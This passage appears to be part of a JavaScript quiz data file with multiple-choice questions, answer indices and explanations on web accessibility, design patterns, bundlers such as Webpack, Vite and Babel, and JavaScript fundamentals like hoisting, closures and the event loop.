    { q: "What is the fastest way to do a basic keyboard accessibility audit?", opts: ["Use a screen reader", "Unplug the mouse and navigate the entire page using only Tab, Enter, Space, Arrow keys — verify every interactive element is reachable and operable", "Run Lighthouse", "Check the HTML source"], correct: 1, explain: "Unplug the mouse test: Tab through every interactive element (links, buttons, inputs), verify focus is always visible, verify all actions work with Enter/Space, check that modals trap focus and Escape closes them, verify no keyboard traps." },
    { q: "What does WCAG stand for?", opts: ["Web Content Accessibility Guidelines — international standards for web accessibility published by W3C", "Web Code Accessibility Guide", "Website Content Audit Guidelines", "Web Core API Guidelines"], correct: 0, explain: "WCAG (Web Content Accessibility Guidelines) is published by W3C. Current version is WCAG 2.2. Three conformance levels: A (minimum), AA (standard target — required by most regulations), AAA (enhanced). WCAG 3.0 is in development." },
    { q: "Which of these is a manual test you should always perform?", opts: ["Run Lighthouse only", "Navigate with a screen reader (VoiceOver on Mac, NVDA on Windows) and verify all content makes sense", "Check visual design only", "Validate HTML"], correct: 1, explain: "Screen reader testing is the only way to verify the actual experience for blind users. Automated tools can't tell if aria labels make sense, if reading order is logical, or if announcements are helpful vs confusing. Even 30 minutes with VoiceOver reveals critical issues automated tools miss." },
  ],
  'pattern-singleton': [
    { q: "What is the Singleton pattern?", opts: ["A class with one method", "A class that allows only one instance to exist and provides a global access point to it", "A function that runs once", "A component that renders once"], correct: 1, explain: "Singleton ensures a class has exactly one instance. Any part of the program accessing it gets the same instance. Common uses: configuration manager, logger, database connection pool, Redux store." },
    { q: "What is the main risk of using Singletons?", opts: ["They are slow", "They create hidden global state — making code harder to test, harder to reason about, and introducing tight coupling", "They use too much memory", "They don't work in JavaScript"], correct: 1, explain: "Singletons are essentially global variables in disguise. Tests become order-dependent (one test's singleton state bleeds into the next). Code becomes tightly coupled to the global instance. This is why dependency injection is often preferred." },
    { q: "How is module-level state in JavaScript similar to Singleton?", opts: ["It isn't similar", "ES modules are singletons — a module is evaluated once and the same exported object is returned to every importer", "Modules are re-created on each import", "Only CommonJS modules are singletons"], correct: 1, explain: "ES modules are cached after first evaluation. Every import of the same module gets the same module instance. This makes module-level variables effectively singletons — useful for shared state like a logger or config object." },
    { q: "In JavaScript, what is the simplest Singleton implementation?", opts: ["A class with a static getInstance() method", "A plain object literal — {} is already a singleton since object literals are evaluated once", "Using Symbol", "Using WeakMap"], correct: 1, explain: "const config = { apiUrl: '...', timeout: 5000 } is a singleton. It's created once and every module that imports it gets the same object reference. Class-based singletons with getInstance() are the Java-style approach, but module-level objects are the idiomatic JavaScript approach." },
  ],

  'pattern-observer': [
    { q: "What problem does the Observer pattern solve?", opts: ["Slow rendering", "Decoupling — subjects don't need to know about observers. Multiple components can react to the same event without tight coupling", "Memory leaks", "Async operations"], correct: 1, explain: "Without Observer, you'd need explicit calls to every dependent: updateChart(); updateTable(); updateSummary(). With Observer, dependents subscribe and are notified automatically. Adding a new dependent doesn't change the subject." },
    { q: "What are the two main roles in the Observer pattern?", opts: ["Producer and Consumer", "Subject (Observable) — maintains subscriber list and notifies on change; Observer — subscribes and reacts to notifications", "Server and Client", "Parent and Child"], correct: 1, explain: "Subject (Observable): maintains a list of observers, notifies them on state change. Observer: subscribes to the subject, implements an update method called by the subject. EventEmitter, addEventListener, and RxJS Observable all implement this pattern." },
    { q: "What is a common memory leak problem with the Observer pattern?", opts: ["Observers are too fast", "Forgetting to unsubscribe — observers are referenced by the subject and can't be garbage collected even after they're no longer needed", "Subjects use too much memory", "Events fire too frequently"], correct: 1, explain: "If an observer subscribes but never unsubscribes, the subject holds a reference preventing GC. In React: always clean up event listeners and subscriptions in useEffect's cleanup function. In class components: unsubscribe in componentWillUnmount." },
    { q: "Which browser API is a built-in implementation of the Observer pattern?", opts: ["fetch API", "addEventListener/removeEventListener — DOM elements are subjects, event handlers are observers", "localStorage", "requestAnimationFrame"], correct: 1, explain: "addEventListener is the Observer pattern built into every browser. The DOM element is the subject. Your callback is the observer. removeEventListener unsubscribes. The DOM notifies all subscribed handlers when the event fires." },
  ],

  'pattern-factory': [
    { q: "What problem does the Factory pattern solve?", opts: ["Slow object creation", "Decoupling object creation from usage — callers don't need to know which class to instantiate, just what type they want", "Memory management", "Async instantiation"], correct: 1, explain: "Without Factory: callers need to know exact class names and constructors — tight coupling. With Factory: callers request a type, the factory decides which class to instantiate. Adding new types doesn't change calling code." },
    { q: "What is the difference between Factory Method and Abstract Factory?", opts: ["They are identical", "Factory Method creates one product via a method override; Abstract Factory creates families of related products via a factory interface", "Abstract Factory is deprecated", "Factory Method is for functions only"], correct: 1, explain: "Factory Method: subclasses override a factory method to change the product created. Abstract Factory: an interface for creating families of related objects (e.g., a UIFactory that creates Button, Input, Modal — with LightUIFactory and DarkUIFactory implementations)." },
    { q: "How does the Factory pattern appear in JavaScript's built-in APIs?", opts: ["It doesn't", "document.createElement('div') — you pass a type string, the factory returns the right DOM element type without you needing to call new HTMLDivElement()", "Array.from() is a factory", "Math.random() is a factory"], correct: 1, explain: "document.createElement() is a classic factory. You pass 'div', 'input', 'canvas' — the factory returns the appropriate HTMLElement subclass. You don't instantiate these directly. React.createElement() is another factory — it creates React elements based on the type argument." },
  ],

  'pattern-strategy': [
    { q: "What is the Strategy pattern?", opts: ["A planning tool", "Define a family of algorithms, encapsulate each one as an object, and make them interchangeable at runtime without changing the client", "A type of cache", "A routing algorithm"], correct: 1, explain: "Strategy: instead of if/else chains for different algorithms, encapsulate each algorithm in an object. The context holds a reference to a strategy and delegates work to it. Swap strategies at runtime without changing the context." },
    { q: "What violation does Strategy pattern fix?", opts: ["DRY violation", "Open/Closed Principle violation — adding a new algorithm shouldn't require modifying existing code, only adding a new strategy class", "Single Responsibility violation", "Memory leaks"], correct: 1, explain: "Without Strategy: adding a new sort algorithm means modifying the sort function with another if/else — violates OCP (open for extension, closed for modification). With Strategy: add a new strategy class, no existing code changes." },
    { q: "How is the Strategy pattern used in React?", opts: ["It isn't", "Render props and higher-order components are Strategy pattern — passing a rendering strategy as a prop instead of hard-coding it", "useReducer implements Strategy", "Context implements Strategy"], correct: 1, explain: "Passing renderItem, filterFn, sortFn as props is the Strategy pattern. The component doesn't hard-code how to render items or filter data — it accepts a strategy function from the caller. This makes components flexible without increasing their complexity." },
  ],

  'pattern-decorator': [
    { q: "What does the Decorator pattern do?", opts: ["Adds CSS styles", "Wraps an object to add new behavior without modifying the original class — open for extension, closed for modification", "Compresses data", "Validates inputs"], correct: 1, explain: "Decorator wraps an existing object with a new object that adds behavior. The wrapper implements the same interface — callers don't know they're talking to a decorator. Stack multiple decorators to add multiple behaviors." },
    { q: "How is the Decorator pattern used in JavaScript/TypeScript?", opts: ["Only in class-based code", "HOCs in React, @decorator syntax in TypeScript, middleware in Express — all wrap functionality around existing functionality", "Only in Angular", "JavaScript doesn't support decorators"], correct: 1, explain: "HOC withAuth(Component) is Decorator pattern — wraps a component to add auth behavior. Express middleware wraps request handling. TypeScript @Injectable, @Component decorators add metadata. Function composition (const enhanced = logger(cache(fetch))) is functional decorator." },
    { q: "What is the difference between Decorator and Proxy patterns?", opts: ["They are identical", "Decorator adds new behavior/interface. Proxy controls access to the same interface — same API, different purpose (access control, caching, logging)", "Proxy is deprecated", "Decorator is only for classes"], correct: 1, explain: "Both wrap objects, but different intent. Decorator: adds features (a logger decorator adds logging capabilities). Proxy: controls access to existing features (a caching proxy intercepts calls and returns cached results without the caller knowing)." },
  ],

  'pattern-proxy': [
    { q: "What is the Proxy pattern?", opts: ["A network proxy", "A surrogate object that controls access to the real object — intercepts operations to add caching, validation, logging, or access control", "A Promise wrapper", "A type alias"], correct: 1, explain: "Proxy intercepts operations on the real object. Use cases: lazy initialization (create expensive object only when needed), access control (check permissions before allowing access), caching (return cached result instead of re-computing), logging (log every access)." },
    { q: "How does JavaScript's built-in Proxy relate to the Proxy design pattern?", opts: ["They are unrelated", "JavaScript's Proxy object IS the Proxy pattern — it intercepts fundamental object operations (get, set, delete, apply) via handler traps", "JavaScript Proxy is only for Arrays", "They have the same name but different concepts"], correct: 1, explain: "JavaScript's Proxy object directly implements the Proxy design pattern. new Proxy(target, handler) creates a proxy that intercepts operations on target. Vue 3's reactivity system is built on JavaScript Proxy — get traps track dependencies, set traps trigger updates." },
    { q: "What is 'virtual proxy' and when is it useful?", opts: ["A proxy that only exists in memory", "Delays expensive object creation until first use — creates a lightweight placeholder that initializes the real object on demand", "A proxy for virtual DOM", "A temporary proxy"], correct: 1, explain: "Virtual proxy: create a lightweight proxy immediately, defer creation of the expensive real object until it's actually needed. Example: a proxy for a large image that shows a placeholder until the image is requested. React.lazy() is virtual proxy — the component isn't loaded until it's rendered." },
  ],

  'pattern-command': [
    { q: "What is the Command pattern?", opts: ["A CLI tool", "Encapsulates a request as an object — enables undoable operations, operation queuing, logging, and transactional behavior", "A function signature", "A keyboard shortcut handler"], correct: 1, explain: "Command wraps an operation in an object with execute() and optionally undo() methods. The invoker (button, menu) holds command objects and calls execute(). The receiver (document, canvas) performs the actual work. Enables undo history by storing executed commands." },
    { q: "What real-world feature is perfectly implemented using Command pattern?", opts: ["Routing", "Undo/redo — each user action is a Command object with execute() and undo(). Maintain a history stack of commands, pop and call undo() to reverse", "Authentication", "Form validation"], correct: 1, explain: "Undo/redo is the canonical Command pattern use case. Each action (type text, move element, change color) is a Command. execute() performs it, undo() reverses it. Store commands in a history array. Ctrl+Z pops the last command and calls undo()." },
    { q: "How does the Command pattern appear in frontend development?", opts: ["It doesn't apply to frontend", "Redux actions are Command pattern — each action is a plain object describing what happened, dispatched to the store which executes it", "Only in Node.js backends", "Only in class-based components"], correct: 1, explain: "Redux actions are Command objects. dispatch({ type: 'ADD_ITEM', payload: item }) is dispatching a command to the reducer (receiver). The Redux DevTools time-travel feature works because actions (commands) are stored and can be replayed or reversed." },
  ],

  'pattern-facade': [
    { q: "What is the Facade pattern?", opts: ["A UI component", "Provides a simplified interface to a complex subsystem — hides complexity behind a clean, easy-to-use API", "A type of proxy", "A performance optimization"], correct: 1, explain: "Facade simplifies a complex API. Your audio system has Amplifier, Tuner, DvdPlayer, Projector — a HomeTheaterFacade exposes watchMovie() which orchestrates all of them. Callers use the simple facade without understanding the subsystem." },
    { q: "What is a real-world example of Facade in JavaScript?", opts: ["Array.map()", "jQuery's $ — it facades dozens of complex browser APIs (DOM manipulation, AJAX, events) behind simple, consistent method calls", "setTimeout", "JSON.parse()"], correct: 1, explain: "jQuery is a perfect Facade. $.ajax() hides XMLHttpRequest complexity. $(selector) hides querySelector and DOM traversal complexity. $('#el').hide() hides style manipulation. One simple API facades the entire messy browser API surface." },
    { q: "What is the difference between Facade and Adapter patterns?", opts: ["They are identical", "Facade simplifies a complex interface for ease of use. Adapter converts one interface to another for compatibility — making incompatible interfaces work together", "Adapter is deprecated", "Facade works only with objects"], correct: 1, explain: "Facade: takes a complex system and provides a simpler interface. Adapter: takes an existing interface and converts it to the interface expected by callers. Facade = simplification. Adapter = translation. Both wrap complexity but for different reasons." },
  ],

  'pattern-pubsub': [
    { q: "What is the key difference between Observer and Pub/Sub patterns?", opts: ["They are identical", "Observer: subjects and observers know each other directly. Pub/Sub: publishers and subscribers are decoupled via a message broker — they never reference each other", "Pub/Sub is newer", "Observer is for UI only"], correct: 1, explain: "Observer: Subject holds a list of Observer references — direct coupling. Pub/Sub: Publisher emits to a channel/topic, Subscriber listens to channels — neither knows about the other. Pub/Sub is more decoupled. EventEmitter is Observer. EventBus/message queues are Pub/Sub." },
    { q: "Which JavaScript pattern is Observer and which is Pub/Sub?", opts: ["Both are the same pattern", "addEventListener is Observer (direct subject-observer coupling). Custom EventTarget/EventBus is Pub/Sub (decoupled via channel name)", "Neither is Observer or Pub/Sub", "Promises are Observer"], correct: 1, explain: "addEventListener: element (subject) directly holds your callback (observer) reference — Observer pattern. A custom EventBus where you publish('cart:updated', data) and subscribe('cart:updated', handler) is Pub/Sub — publisher and subscriber never reference each other, only the channel name." },
    { q: "What is a common problem with Pub/Sub systems?", opts: ["They are too fast", "Debugging is hard — following the flow of an event requires knowing all subscribers. Events can fire in unexpected order. Memory leaks from forgotten subscriptions", "They don't work in browsers", "They require a server"], correct: 1, explain: "Pub/Sub makes code flexible but hard to trace. When something breaks, finding which subscriber caused it requires checking all subscribers for that channel. Tools like Redux DevTools solve this by making all events/actions visible and traceable." },
  ],

  'pattern-mvc': [
    { q: "What does MVC stand for and what does each part do?", opts: ["Model View Controller — Model: UI logic, View: data, Controller: networking", "Model View Controller — Model: data/business logic, View: UI rendering, Controller: handles input and updates Model", "Multiple View Container", "Module View Component"], correct: 1, explain: "Model: data, business logic, state. View: displays data, sends user actions to Controller. Controller: receives input, updates Model, selects View. Goal: separate concerns so changing UI doesn't break business logic and vice versa." },
    { q: "How does React fit into MVC?", opts: ["React is the full MVC stack", "React is primarily the View layer. State management (Redux, Zustand) is the Model. Event handlers/reducers are the Controller. Or more accurately: React doesn't enforce MVC", "React replaces MVC", "React is only the Controller"], correct: 1, explain: "React is a view library — it renders UI. State management handles Model concerns. React doesn't enforce MVC strictly. Many React apps use a component-based architecture that blurs MVC boundaries. The important principle MVC embodies — separation of concerns — is still valuable." },
    { q: "What is MVVM and how does it differ from MVC?", opts: ["They are identical", "MVVM: Model-View-ViewModel. ViewModel exposes data streams the View binds to directly — two-way data binding. No explicit Controller. Used in Angular, Vue, and WPF/Xamarin", "MVVM is older than MVC", "MVVM doesn't have a Model"], correct: 1, explain: "MVVM replaces Controller with ViewModel. The View binds directly to ViewModel properties — changes in ViewModel automatically update the View and vice versa (two-way binding). Angular's component + service pattern is MVVM. Vue's data properties with v-model are MVVM." },
    { q: "What architectural pattern does Redux implement?", opts: ["MVC", "Flux/CQRS — unidirectional data flow: Action → Reducer → Store → View → Action. State is read-only, changes via dispatched actions only", "MVVM", "Observer"], correct: 1, explain: "Redux implements the Flux architecture (Facebook's reaction to MVC's bidirectional data flow issues). Strict unidirectional flow: dispatch action → reducer computes new state → store updates → React re-renders. This predictable flow makes debugging easy." },
  ],
'bundler-webpack': [
  { q: "What is the role of a 'loader' in Webpack?", opts: ["Loads the browser", "Transforms files before they are added to the dependency graph — e.g. css-loader transforms CSS into JavaScript", "Loads external scripts", "Manages npm packages"], correct: 1, explain: "Webpack only understands JavaScript and JSON by default. Loaders transform other file types (CSS, images, TypeScript, JSX) into modules Webpack can process. css-loader parses CSS imports. babel-loader transpiles JS. file-loader handles images." },
  { q: "What is code splitting in Webpack?", opts: ["Splitting a file into smaller lines", "Splitting the bundle into multiple chunks loaded on demand — reducing initial bundle size", "Splitting CSS from JavaScript", "Splitting dev and prod configs"], correct: 1, explain: "Code splitting creates multiple bundle files instead of one giant file. The critical chunk loads immediately. Other chunks (routes, heavy components) load on demand. Result: faster initial page load — users only download code they actually need." },
  { q: "What does 'tree shaking' eliminate?", opts: ["Slow code", "Dead code — exported functions/classes that are never imported anywhere in the app", "Large dependencies", "Duplicate CSS"], correct: 1, explain: "Tree shaking statically analyzes ES module import/export statements and removes exports that are never imported. If you import { add } from './math' and the file also exports multiply, the multiply function is removed from the bundle." },
  { q: "What is the difference between Webpack's 'development' and 'production' modes?", opts: ["No difference", "Development: fast builds, source maps, no minification. Production: minified, tree-shaken, optimized, no source maps (or hidden)", "Development uses Babel, production doesn't", "Production mode adds TypeScript support"], correct: 1, explain: "mode: 'development' prioritizes build speed: readable output, source maps, no minification. mode: 'production' prioritizes bundle quality: minification (Terser), tree shaking, scope hoisting, optimized chunk IDs. Always specify mode explicitly." },
  { q: "What is a Webpack plugin vs a loader?", opts: ["They are the same", "Loader: transforms specific file types. Plugin: hooks into the broader build process — HTML generation, bundle analysis, environment variables, copying files", "Plugins are for CSS only", "Loaders run after plugins"], correct: 1, explain: "Loaders transform individual files (CSS → JS, TS → JS). Plugins operate on the entire compilation — HtmlWebpackPlugin generates HTML, MiniCssExtractPlugin extracts CSS, BundleAnalyzerPlugin visualizes bundle size, DefinePlugin injects environment variables." },
],

'bundler-vite': [
  { q: "Why is Vite dramatically faster than Webpack during development?", opts: ["Vite uses more RAM", "Vite serves source files as native ES modules — no bundling in dev. Browser requests only the files it needs. Webpack must bundle everything first.", "Vite skips TypeScript checking", "Vite uses multiple CPUs"], correct: 1, explain: "Webpack bundles ALL code before the dev server starts. 5000 modules = 30+ seconds. Vite serves unbundled ES modules directly to the browser. The browser requests only imported files on demand. Dev server starts in milliseconds regardless of project size." },
  { q: "What does Vite use for production builds?", opts: ["ESBuild for everything", "Rollup for production bundles — better code splitting and tree shaking than ESBuild. ESBuild is used for dependency pre-bundling and TypeScript transpilation.", "Webpack under the hood", "Its own custom bundler"], correct: 1, explain: "Vite uses a hybrid approach: ESBuild (Go-based, 100x faster than Webpack) for transforming TypeScript/JSX and pre-bundling node_modules. Rollup for the final production build — better tree shaking and code splitting. Best of both tools." },
  { q: "What is 'dependency pre-bundling' in Vite?", opts: ["Installing npm packages", "Converting CommonJS node_modules to ES modules and bundling them once — so the browser doesn't make hundreds of requests for lodash internals", "Caching API responses", "Pre-compiling TypeScript"], correct: 1, explain: "Lodash has 600+ internal modules. Without pre-bundling, the browser would make 600 requests for lodash. Vite pre-bundles dependencies with ESBuild on first run — converting CJS to ESM and merging into single files. Cached until dependencies change." },
  { q: "What is Hot Module Replacement (HMR) and why is Vite's faster?", opts: ["A Webpack-only feature", "Updates changed modules in the browser without full page reload. Vite's HMR uses native ESM — only re-requests the changed file. Webpack must re-bundle the entire module graph.", "HMR is deprecated", "HMR requires React"], correct: 1, explain: "HMR replaces changed modules at runtime — React state preserved during CSS/component updates. Webpack HMR re-bundles affected module chains. Vite HMR uses native ESM: browser re-requests just the one changed file. HMR speed stays constant regardless of app size." },
],

'bundler-rollup': [
  { q: "What makes Rollup better than Webpack for library bundling?", opts: ["Rollup is newer", "Rollup was designed for ES module output — produces clean, readable bundles without Webpack's module runtime boilerplate. Better for libraries consumed by other bundlers.", "Rollup is faster than Webpack", "Rollup has more plugins"], correct: 1, explain: "Webpack injects a runtime module system into every bundle. For apps this is fine. For libraries, it adds unnecessary overhead. Rollup outputs clean ES modules (and CJS) that tree shake perfectly when consumed by other bundlers. Most npm libraries (React, Vue, Lodash) use Rollup." },
  { q: "What ES module syntax is required for tree shaking to work?", opts: ["require() / module.exports (CommonJS)", "import / export (ES modules) — static syntax allows bundlers to analyze the dependency graph at build time without executing code", "Dynamic import()", "AMD define()"], correct: 1, explain: "Tree shaking requires static analysis. ES module imports/exports are static — they can't be conditionally executed. CommonJS require() is dynamic — the bundler can't know at build time which exports will be used. Always use ES module syntax in code you want tree-shaken." },
  { q: "What is 'scope hoisting' in bundlers?", opts: ["Moving code to the top of files", "Merging module code into a single scope instead of wrapping each module in a function — reduces bundle size and improves runtime performance", "CSS scope isolation", "Variable hoisting"], correct: 1, explain: "Without scope hoisting: each module wrapped in a function closure (overhead). With scope hoisting (Rollup default, Webpack's ModuleConcatenationPlugin): all modules merged into a single scope. Smaller bundle, faster execution, better minification." },
],

'bundler-babel': [
  { q: "What is the difference between a Babel preset and a plugin?", opts: ["They are identical", "Plugin: transforms one specific syntax feature. Preset: a collection of plugins for a use case (@babel/preset-env, @babel/preset-react, @babel/preset-typescript)", "Presets are deprecated", "Plugins run after presets"], correct: 1, explain: "A plugin handles one thing (@babel/plugin-transform-arrow-functions). A preset bundles related plugins: @babel/preset-env transforms all modern JS for target browsers, @babel/preset-react transforms JSX, @babel/preset-typescript strips TypeScript types." },
  { q: "What does @babel/preset-env do?", opts: ["Sets up environment variables", "Automatically determines which transforms to apply based on target browsers — only transforms syntax that the targets don't support natively", "Configures Node.js environment", "Sets up the test environment"], correct: 1, explain: "@babel/preset-env reads your browserslist config (or targets option) and only applies transforms needed for those browsers. Target modern browsers = fewer transforms = smaller bundle. Don't specify targets = transforms everything = unnecessary overhead." },
  { q: "What is the difference between Babel transpilation and polyfilling?", opts: ["They are the same", "Transpilation: syntax transformation (arrow functions → function expressions). Polyfilling: adding missing APIs (Promise, Array.from) to older environments via core-js", "Polyfilling is deprecated", "Babel only does transpilation"], correct: 1, explain: "Transpilation changes syntax: () => {} becomes function() {}. Polyfilling adds missing built-ins: adds Promise, fetch, Array.prototype.flat to environments that lack them. Babel handles transpilation. core-js (via useBuiltIns in preset-env) handles polyfills." },
  { q: "Why is Babel being replaced by SWC and ESBuild in many projects?", opts: ["Babel has security issues", "Babel is written in JavaScript — slow for large codebases. SWC (Rust) and ESBuild (Go) are 10-100x faster, enabling near-instant builds", "Babel doesn't support TypeScript", "Babel is deprecated"], correct: 1, explain: "Babel's JavaScript runtime is the bottleneck at scale. SWC (used by Next.js 13+) and ESBuild (used by Vite) are compiled languages — Rust and Go respectively — and are dramatically faster. Next.js replaced Babel with SWC and reported 17x faster transforms." },
],

'bundler-tsconfig': [
  { q: "What does 'strict: true' in tsconfig enable?", opts: ["Strict CSS", "Enables a set of strict type checking flags: strictNullChecks, noImplicitAny, strictFunctionTypes, and more — catching more bugs at compile time", "Makes TypeScript syntax stricter", "Requires explicit return types everywhere"], correct: 1, explain: "strict: true is a shorthand enabling: strictNullChecks (null/undefined must be handled), noImplicitAny (all values must have types), strictFunctionTypes, strictPropertyInitialization, and others. Always enable this — it catches the most impactful bugs." },
  { q: "What is the difference between 'target' and 'module' in tsconfig?", opts: ["They are identical", "target: what JS syntax to output (ES2020, ESNext). module: what module system to use (CommonJS, ESModule, NodeNext)", "target is for Node, module is for browsers", "module controls the target"], correct: 1, explain: "target: 'ES2020' means TypeScript compiles to ES2020 syntax (keeps optional chaining, nullish coalescing, etc.). module: 'CommonJS' means use require/module.exports. module: 'ESNext' means use import/export. They're independent settings." },
  { q: "What does 'paths' in tsconfig do?", opts: ["Sets file paths for Node.js", "Configures path aliases — '@/components' → './src/components'. Enables clean imports instead of deep relative paths", "Controls output directory", "Sets the project root path"], correct: 1, explain: "paths allows import aliases: import Button from '@/components/Button' instead of import Button from '../../../components/Button'. Requires matching config in your bundler (Webpack alias, Vite resolve.alias) since TypeScript paths only affect type checking, not compilation." },
],

'bundler-cicd': [
  { q: "What is the purpose of CI (Continuous Integration) for frontend?", opts: ["Deploying to production automatically", "Automatically running tests, linting, type checking, and build verification on every push — catching issues before they reach main branch", "Monitoring production errors", "Managing npm packages"], correct: 1, explain: "CI runs your automated checks on every PR/push: ESLint, TypeScript checks, unit tests, integration tests, build success verification. If any check fails, the PR is blocked. This prevents broken code from merging to main." },
  { q: "What is a 'preview deployment'?", opts: ["A staging environment", "A unique URL automatically deployed for every PR — allows reviewing visual/functional changes before merging without affecting production or staging", "A beta version of the app", "A local development server"], correct: 1, explain: "Vercel, Netlify, and Cloudflare Pages automatically deploy each PR to a unique URL (pr-123.myapp.vercel.app). Team members can review the actual running changes without setting up locally. Design reviews, QA, and stakeholder approvals happen on the real app." },
  { q: "What should a frontend CI pipeline check on every PR?", opts: ["Only unit tests", "Type checking (tsc --noEmit), linting (ESLint), unit tests, build success, and optionally: bundle size checks, accessibility tests, visual regression tests", "Only the build", "Only deployment"], correct: 1, explain: "Minimum CI pipeline: TypeScript compile check, ESLint, unit/integration tests, production build. Additional value: bundle size budget checks (fail if bundle grows >X KB), Lighthouse CI for performance regressions, Playwright for E2E on preview deployments." },
],

'bundler-perf': [
  { q: "What tool visualizes what's taking up space in your JavaScript bundle?", opts: ["Chrome DevTools", "webpack-bundle-analyzer or Rollup's visualizer — shows an interactive treemap of every module and its size contribution", "Lighthouse", "The Network tab"], correct: 1, explain: "webpack-bundle-analyzer creates an interactive treemap showing every module in your bundle, its size (parsed and gzipped), and which chunk it belongs to. This reveals surprises: importing moment.js for one function, duplicate packages, unexpectedly large polyfills." },
  { q: "What is 'dynamic import' and how does it reduce initial bundle size?", opts: ["A way to import from URLs", "import('module') returns a Promise — the module is split into a separate chunk downloaded only when the import is called, not at startup", "Importing variables dynamically", "A Webpack-specific feature"], correct: 1, explain: "Dynamic import() creates an automatic code split point. The imported module goes into a separate chunk. That chunk only downloads when the import() call executes. For rarely-used features (admin panel, complex charts), this dramatically reduces the code users download on initial load." },
  { q: "A bundle size check fails in CI — bundle grew from 200KB to 350KB. What do you investigate first?", opts: ["Revert all changes", "Run bundle analyzer to find what grew — common culprits: new large dependency, lost tree shaking (import * instead of named imports), duplicate packages", "Increase the size budget", "Minify more aggressively"], correct: 1, explain: "Run webpack-bundle-analyzer or rollup-plugin-visualizer to see exactly what changed. Common causes: accidentally importing entire lodash (import _ from 'lodash' instead of import { pick } from 'lodash/pick'), a new dependency that pulls in a large transitive dependency, or a change that breaks tree shaking." },
  { q: "What is the difference between parsed size and gzipped size in bundle analysis?", opts: ["They are the same", "Parsed size: JS bytes the browser parses and executes (affects JS execution time). Gzipped size: bytes transferred over network (affects download time). Both matter but measure different bottlenecks.", "Gzipped size is always smaller", "Parsed size includes images"], correct: 1, explain: "Gzip compresses text well — repetitive code compresses a lot. A 500KB parsed bundle might be 150KB gzipped. Gzipped size affects download time (network). Parsed size affects JS parse/compile time (CPU). Monitor both: gzipped for load time, parsed for execution time." },
],
'ji-var-let-const': [
  { q: "What does this print?\nconsole.log(x);\nvar x = 5;", opts: ["5", "undefined", "ReferenceError", "null"], correct: 1, explain: "var is hoisted and initialized to undefined during the creation phase. The assignment stays in place. So console.log runs before x is assigned — prints undefined, not 5 or an error." },
  { q: "What does this print?\nconsole.log(y);\nlet y = 5;", opts: ["undefined", "5", "ReferenceError: Cannot access 'y' before initialization", "null"], correct: 2, explain: "let is hoisted but NOT initialized — it's in the Temporal Dead Zone (TDZ). Accessing it before the declaration line throws ReferenceError. This is intentional — prevents the confusing undefined behavior of var." },
  { q: "What is the Temporal Dead Zone?", opts: ["A deleted variable", "The period between a let/const variable being hoisted and its declaration line — accessing it throws ReferenceError", "A garbage collected variable", "A scope boundary"], correct: 1, explain: "let and const ARE hoisted (engine registers them during creation phase). But unlike var, they're not initialized to undefined. From scope start until the declaration line, they're in the TDZ — inaccessible. Temporal because it's time-based, not location-based." },
  { q: "What is the difference between const and Object.freeze()?", opts: ["They are identical", "const prevents reassignment of the variable binding. Object.freeze() prevents mutation of the object's properties. const obj = {} still allows obj.x = 1.", "const deep freezes objects", "Object.freeze() prevents reassignment"], correct: 1, explain: "const only locks the binding — the variable can't point to a different object. But the object itself is still mutable: obj.name = 'changed' works fine. Object.freeze(obj) makes the object's properties read-only (shallow). You need both for a truly locked object." },
  { q: "Which has block scope?", opts: ["var only", "let and const — they are scoped to the nearest { } block. var is function-scoped and ignores blocks.", "All three", "None of them"], correct: 1, explain: "var is function-scoped — it leaks out of if/for/while blocks into the enclosing function. let and const are block-scoped — they only exist within the { } they were declared in. This is why var in a for loop leaks the counter variable." },
  { q: "What does this print?\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}", opts: ["0, 1, 2", "3, 3, 3", "0, 0, 0", "undefined x3"], correct: 1, explain: "var is function-scoped — all three callbacks close over the SAME i variable. By the time setTimeout fires, the loop is done and i is 3. Fix: use let (block-scoped — creates a new i per iteration) or an IIFE." },
],

'ji-closures': [
  { q: "What is a closure?", opts: ["A function with no parameters", "A function that retains access to variables from its outer scope even after that outer function has returned", "A private class method", "A self-invoking function"], correct: 1, explain: "A closure is formed when an inner function references variables from an outer function's scope. The inner function 'closes over' those variables — they're kept alive in memory even after the outer function returns." },
  { q: "What does this return?\nfunction makeAdder(x) {\n  return (y) => x + y;\n}\nconst add5 = makeAdder(5);\nadd5(3);", opts: ["undefined", "8", "5", "Error"], correct: 1, explain: "makeAdder(5) returns an arrow function that closes over x=5. Calling add5(3) executes that function with y=3, returning 5+3=8. This is partial application via closure — a common interview pattern." },
  { q: "Do closures hold a reference or a copy of outer variables?", opts: ["A copy of the value at creation time", "A live reference — the closure sees the CURRENT value of the variable, not the value when the closure was created", "A frozen snapshot", "It depends on the type"], correct: 1, explain: "Closures capture a LIVE REFERENCE to the variable — not a snapshot of its value. This is exactly why the var loop prints 3,3,3: all closures share the same i reference and see its final value. If closures copied values, it would print 0,1,2." },
  { q: "What is the module pattern and how does it use closures?", opts: ["An ES6 import pattern", "An IIFE that returns a public API while keeping private state hidden via closure — the returned functions close over private variables", "A class-based pattern", "A design framework"], correct: 1, explain: "const counter = (function() { let count = 0; return { inc: () => ++count, get: () => count }; })(). The returned object's methods close over count — it's private (not accessible from outside) but accessible to the methods. Classic encapsulation before ES6 classes." },
  { q: "What is a practical use case for closures?", opts: ["DOM manipulation only", "Memoization, factory functions, private state (module pattern), event handlers with captured context, partial application", "CSS animations", "HTTP requests"], correct: 1, explain: "Closures enable: private variables (module pattern), function factories (makeAdder), memoization (cache in outer scope), event handlers that remember context, React hooks (useState closes over its state slot index). They're fundamental to JavaScript patterns." },
],

'ji-event-loop': [
  { q: "What order does this print?\nconsole.log('A');\nsetTimeout(() => console.log('B'), 0);\nPromise.resolve().then(() => console.log('C'));\nconsole.log('D');", opts: ["A, B, C, D", "A, D, C, B", "A, D, B, C", "A, C, B, D"], correct: 1, explain: "A and D are synchronous — run immediately. Promise.then() goes to the microtask queue (HIGH priority). setTimeout goes to the macrotask queue (LOWER priority). After sync code: drain ALL microtasks (C) then one macrotask (B). Order: A, D, C, B." },
  { q: "What is the difference between microtasks and macrotasks?", opts: ["Speed difference only", "Microtasks (Promises, queueMicrotask) drain COMPLETELY before any macrotask (setTimeout, setInterval) runs", "Macrotasks run first", "They are the same"], correct: 1, explain: "After each task, ALL pending microtasks drain before the next macrotask starts. Promise.then() always runs before setTimeout(fn, 0) even though both are async. Microtasks: Promise callbacks, queueMicrotask, MutationObserver. Macrotasks: setTimeout, setInterval, I/O." },
